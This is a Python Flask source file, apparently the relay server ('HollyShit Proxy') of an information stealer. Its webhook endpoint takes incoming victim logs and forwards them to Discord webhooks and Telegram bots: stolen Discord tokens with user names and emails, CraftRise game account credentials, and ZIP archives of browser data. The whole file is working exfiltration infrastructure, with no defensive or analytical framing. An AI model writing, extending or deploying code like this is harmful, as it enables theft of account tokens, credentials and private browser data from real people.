from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

# Global değişken - en son ZIP dosyasının yolu
last_zip_path = None

def send_discord_embed(url, embed_data):
    """Discord'a embed gönder"""
    if not url:
        return
    try:
        requests.post(url, json=embed_data, timeout=30)
    except Exception as e:
        print(f"Discord embed hatası: {e}")

def send_discord_with_file(url, content, file_path):
    """Discord'a mesaj ve DOSYA (ZIP) gönder"""
    if not url or not file_path or not os.path.exists(file_path):
        return
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'content': content}
            requests.post(url, data=data, files=files, timeout=60)
        print(f"[+] ZIP dosyası Discord'a gönderildi: {file_path}")
    except Exception as e:
        print(f"Discord dosya gönderme hatası: {e}")
        send_discord_embed(url, {"content": content})

def send_telegram_clean(token, chat_id, msg):
    """Telegram'a temiz metin gönder (markdownsuz)"""
    if token and chat_id and msg:
        try:
            # Markdown ve kod işaretlerini temizle
            msg = re.sub(r'\*', '', msg)
            msg = re.sub(r'`', '', msg)
            msg = re.sub(r'```\w*\n?', '', msg)
            msg = re.sub(r'\n```', '', msg)
            msg = re.sub(r'\[([^\]]+)\]\([^\)]+\)', r'\1', msg)
            msg = re.sub(r'_', '', msg)
            msg = re.sub(r'\n\s*\n', '\n\n', msg)
            
            if len(msg) > 4000:
                msg = msg[:4000] + "..."
            
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except Exception as e:
            print(f"Telegram hatası: {e}")

def extract_craftrise_account(content):
    match = re.search(r'`([^`]+)`', content)
    if match:
        return match.group(1)
    lines = content.split('\n')
    for line in lines:
        if '`' in line and ':' in line:
            match = re.search(r'`([^`]+)`', line)
            if match:
                return match.group(1)
    return content

def embed_to_telegram_clean(embed):
    """Discord embed'ini Telegram uyumlu TEMIZ metne çevir (işaretsiz)"""
    text = ""
    title = embed.get("title", "")
    if title:
        clean_title = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', title)
        clean_title = re.sub(r'[*`]', '', clean_title)
        text += f"{clean_title}\n"
    
    fields = embed.get("fields", [])
    for field in fields:
        name = field.get("name", "")
        value = field.get("value", "")
        name = re.sub(r'<[^>]+>', '', name)
        name = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', name)
        name = re.sub(r'[*`_]', '', name)
        value = re.sub(r'<[^>]+>', '', value)
        value = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', value)
        value = re.sub(r'[*`_]', '', value)
        value = value.replace('```fix\n', '').replace('\n```', '')
        text += f"• {name.strip()}: {value.strip()}\n"
    
    return text

@app.route('/webhook', methods=['POST'])
def webhook():
    global last_zip_path
    
    try:
        data = request.get_json()
        log_type = data.get("type", "unknown")
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            payload = data.get("data", data)
            send_discord_embed(CRAFTRISE_WEBHOOK, payload)
            
            content = payload.get("content", "")
            account = extract_craftrise_account(content)
            send_telegram_clean(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, account)
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            payload = data.get("data", data)
            send_discord_embed(DISCORD_WEBHOOK, payload)
            
            # Telegram için token bilgilerini embed'den çek (content değil!)
            embeds = payload.get("embeds", [])
            if embeds:
                fields = embeds[0].get("fields", [])
                user = ""
                token = ""
                email = ""
                for field in fields:
                    name = field.get("name", "")
                    value = field.get("value", "")
                    if "User" in name:
                        user = re.sub(r'[`]', '', value)
                    elif "Token" in name:
                        token = value.replace('```fix\n', '').replace('\n```', '').replace('`', '')
                        token = token[:40] + "..." if len(token) > 40 else token
                    elif "Email" in name:
                        email = re.sub(r'[`]', '', value)
                tg_msg = f"Discord Token!\n\nUser: {user}\nToken: {token}\nEmail: {email}"
                send_telegram_clean(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ BROWSER / MASTER ============
        else:
            payload = data.get("data", data)
            zip_path = payload.get("zip_path", last_zip_path)
            
            content_text = payload.get("content", "")
            if zip_path and os.path.exists(zip_path):
                send_discord_with_file(MASTER_WEBHOOK, content_text, zip_path)
            else:
                send_discord_embed(MASTER_WEBHOOK, payload)
            
            # Telegram için temiz metin oluştur
            tg_msg = ""
            
            content = payload.get("content", "")
            if content:
                clean_content = re.sub(r'@everyone', '', content)
                clean_content = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', clean_content)
                clean_content = re.sub(r'[*`]', '', clean_content)
                tg_msg += f"{clean_content.strip()}\n\n"
            
            embeds = payload.get("embeds", [])
            for embed in embeds:
                tg_msg += embed_to_telegram_clean(embed)
                tg_msg += "\n"
            
            # Download linki varsa ekle
            for embed in embeds:
                if embed.get("url") and embed.get("url") != "#":
                    tg_msg += f"\nDownload Link: {embed['url']}\n"
                    break
            
            send_telegram_clean(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
            
            # GLOBAL WEBHOOK'a da DOSYA OLARAK gönder
            if zip_path and os.path.exists(zip_path):
                send_discord_with_file(WEBHOOK, content_text, zip_path)
            else:
                send_discord_embed(WEBHOOK, payload)
            
            # Global Telegram'a da gönder
            send_telegram_clean(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
            
            if zip_path:
                last_zip_path = zip_path
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
